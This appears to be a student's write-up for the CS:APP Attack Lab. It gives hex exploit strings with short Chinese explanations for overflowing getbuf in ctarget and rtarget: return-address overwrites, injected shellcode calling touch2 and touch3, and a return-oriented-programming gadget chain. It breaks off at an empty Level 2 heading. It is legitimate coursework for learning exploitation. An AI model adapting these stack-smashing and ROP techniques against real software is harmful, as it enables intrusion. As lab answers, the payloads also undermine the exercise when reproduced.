### ctarget

#### Level 1

```c
30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30
/* 40 dummy bytes */

c0 17 40 00 00 00 00 00
/* inject return address*/
```

`getbuf`返回前做了`add $0x28,%rsp`，这时%rsp位置上就是函数返回地址，把它换掉即可。

#### Level 2

```c
48 c7 c7 fa 97 b9 59  /* mov $0x59b997fa, %rdi */
68 ec 17 40 00        /* pushq  $0x4017ec */
c3                    /* retq */
/* byte code = 13 bytes */

01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 
/* 27 dummy bytes */

78 dc 61 55 00 00 00 00
```

和Level1一样hack返回地址，这次跳回输入缓冲区的头部，这里放一段inject code。需要把待传参的参数放在rdi寄存器里，然后push一个`touch2`的返回地址并`ret`。

#### Level 3 

```c
48 c7 c7 a8 dc 61 55  /* mov $0x5561dca8, %rdi */
68 fa 18 40 00        /* pushq  $0x4018fa */
c3                    /* retq */
/* byte code = 13 bytes */

01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27
/* 27 dummy bytes */

78 dc 61 55 00 00 00 00
/* return address */

35 39 62 39 39 37 66 61 00
/* injected string */
```

需要把cookie的字符串摆在某个内存位置中。如果摆在return address之前，相当于位于`getbuf`的栈帧中，这部分一定会被`hexmatch`的栈帧覆盖掉（该函数申请了大数组）。所以必须把这部分字符串摆在返回地址之后，即`test`的栈帧中。

### rtarget

#### Level 1

```c
40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40
/* 40 dummy bytes */

ab 19 40 00 00 00 00 00
/* gadget 1: popq %rax*/

fa 97 b9 59 00 00 00 00
/* my cookie */

c5 19 40 00 00 00 00 00 
/* gadget 2: movq %rax, %rdi*/

ec 17 40 00 00 00 00 00
/* touch2 entry */
```

注意每次`ret`会使得`%rsp`+8。

#### Level 2
